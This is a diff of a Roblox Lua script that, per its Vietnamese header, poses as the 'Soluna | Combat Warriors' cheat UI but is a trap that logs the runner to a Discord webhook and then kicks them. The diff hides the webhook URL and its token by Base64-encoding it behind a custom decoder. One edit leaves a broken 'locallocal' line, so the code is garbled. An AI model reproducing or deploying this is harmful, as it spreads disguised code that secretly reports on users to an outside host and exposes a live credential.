@@ -1,4 +1,8 @@
-
+--[[  Fake Soluna UI + Trap + 60s Countdown
+     • Khi execute: gửi log ngay + hiện UI + bắt đầu đếm 60s
+     • Trong 60s: bấm bất kỳ nút nào -> kick ngay
+     • Hết 60s mà chưa bấm -> auto kick
+--]]
 
 -- // Services
 local Players = game:GetService("Players")
@@ -6,8 +10,26 @@ local HttpService = game:GetService("HttpService")
 local RunService = game:GetService("RunService")
 local player = Players.LocalPlayer
 
--- // Webhook Discord (link mới)
-local webhookUrl = "https://discord.com/api/webhooks/1259819377864478760/RS0hEyFNE2kEEmHnGrfJh9QNEdsxY7jJTKj1UVRnBy_yOJTx0l9LEc6uuJZag1nIvpwq"
+-- // Hàm decode Base64
+local function decode64(str)
+    local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+    str = string.gsub(str, '[^'..b..'=]', '')
+    return (str:gsub('.', function(x)
+        if x == '=' then return '' end
+        local r,f='',(b:find(x)-1)
+        for i=6,1,-1 do r=r..(f%2^i - f%2^(i-1) > 0 and '1' or '0') end
+        return r;
+    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
+        if #x ~= 8 then return '' end
+        local c=0
+        for i=1,8 do c=c + (x:sub(i,i)=='1' and 2^(8-i) or 0) end
+        return string.char(c)
+    end))
+end
+
+-- // Webhook Discord (mã hóa Base64)
+local encodedWebhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI1OTgxOTM3Nzg2NDQ3ODc2MC9SUzBoRXlGTkUyazBLbUhubEdyZkpoOVFORWRzeFk3akpUS2oxVVZSbkJ5X3lPSlR4MGw5TEVjNnV1SlphZzFuSXZwd3E="
+local webhookUrl = decode64(encodedWebhook)
 
 -- // Ban message gốc
 local banMessage = [[
@@ -77,33 +99,7 @@ main.Position = UDim2.new(0.5, -280, 0.5, -180)
 main.BackgroundColor3 = Color3.fromRGB(25,25,25)
 main.BorderSizePixel = 0
 main.ClipsDescendants = true
-local cMain = Instance.new("UICorner", main) cMain.CornerRadius = UDim.new(0,16)
-local sMain = Instance.new("UIStroke", main) sMain.Color = Color3.fromRGB(50,50,50) sMain.Thickness = 2
-
--- Top bar with title
-local top = Instance.new("Frame", main)
-top.Size = UDim2.new(1, 0, 0, 42)
-top.BackgroundColor3 = Color3.fromRGB(32,32,36)
-local cTop = Instance.new("UICorner", top) cTop.CornerRadius = UDim.new(0,16)
-local sTop = Instance.new("UIStroke", top) sTop.Color = Color3.fromRGB(60,60,66) sTop.Thickness = 1
-
-local title = Instance.new("TextLabel", top)
-title.BackgroundTransparency = 1
-title.Position = UDim2.new(0, 14, 0, 0)
-title.Size = UDim2.new(1, -14, 1, 0)
-title.Font = Enum.Font.GothamSemibold
-title.TextSize = 16
-title.TextXAlignment = Enum.TextXAlignment.Left
-title.TextColor3 = Color3.fromRGB(235,235,238)
-title.Text = "Soluna | Combat Warriors"
-
--- Sidebar
-local side = Instance.new("Frame", main)
-side.Size = UDim2.new(0, 140, 1, -50)
-side.Position = UDim2.new(0, 10, 0, 50)
-side.BackgroundColor3 = Color3.fromRGB(20,20,22)
-local cSide = Instance.new("UICorner", side) cSide.CornerRadius = UDim.new(0, 12)
-local sSide = Instance.new("UIStroke", side) sSide.Color = Color3.fromRGB(55,55,60) sSide.Thickness = 1
+locallocal sSide = Instance.new("UIStroke", side) sSide.Color = Color3.fromRGB(55,55,60) sSide.Thickness = 1
 
 local sideList = Instance.new("UIListLayout", side)
 sideList.Padding = UDim.new(0, 8)
